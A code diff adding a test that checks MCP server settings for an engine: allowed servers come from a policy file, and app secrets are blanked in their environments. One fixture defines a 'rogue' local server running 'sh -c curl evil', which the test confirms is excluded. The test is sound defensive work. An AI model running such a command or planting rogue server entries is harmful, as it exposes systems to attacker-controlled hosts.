@@ -93,3 +93,27 @@ test("the 1.x engine starts no chat and no turn", () => {
     expect(startsV1Chat(method!, path!)).toBe(false);
   }
 });
+
+test("MCP on the 2.x engine: the gate lists the server list's ids, entries stay direct tools without the app's secrets", () => withDir(async (dir) => {
+  const { v2McpConfig, v2McpGate, desiredV2Mcp } = await import("./engine-v2-mcp.js");
+  const { writePolicyFile } = await import("./mcp-allow/mcp-allow.mjs");
+  const { mcpPolicyFile, writeWorkspaceMcp } = await import("./mcp-allow/state.js");
+  expect(v2McpGate(dir)).toEqual([]);
+  const engineEnv = { OPENCODE_PASSWORD: "pw", OMNIRUSH_POLICY_TOKEN: "tok", PATH: "/bin" };
+  expect(v2McpConfig({ type: "local", command: ["node", "s.js"], environment: { A: "1" }, timeout: 2000 }, engineEnv)).toEqual({
+    type: "local", command: ["node", "s.js"], environment: { A: "1", OPENCODE_PASSWORD: "", OMNIRUSH_POLICY_TOKEN: "" },
+    codemode: false, timeout: { startup: 2000, catalog: 2000, execution: 2000 },
+  });
+  expect(v2McpConfig({ type: "remote", url: "https://x.test/mcp", oauth: false, enabled: false }, engineEnv)).toEqual({ type: "remote", url: "https://x.test/mcp", oauth: false, disabled: true, codemode: false });
+  expect(v2McpConfig({ type: "local", command: [] }, engineEnv)).toBeNull();
+  writePolicyFile(mcpPolicyFile(dir), JSON.parse(await readFile(join(import.meta.dir, "mcp-allow", "mcp-policy.fixture.json"), "utf8")));
+  expect(v2McpGate(dir)).toContain("memory");
+  const root = join(dir, "proj");
+  writeWorkspaceMcp(dir, root, { memory: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-memory"] }, rogue: { type: "local", command: ["sh", "-c", "curl evil"] } });
+  const desired = await desiredV2Mcp(dir, root, engineEnv, v2McpGate(dir));
+  expect(Object.keys(desired)).toEqual(["memory"]);
+  expect(desired.memory).toMatchObject({ type: "local", codemode: false });
+  expect((desired.memory!.environment as Record<string, string>).OPENCODE_PASSWORD).toBe("");
+  // Not on the gate: left out.
+  expect(await desiredV2Mcp(dir, root, engineEnv, [])).toEqual({});
+}));
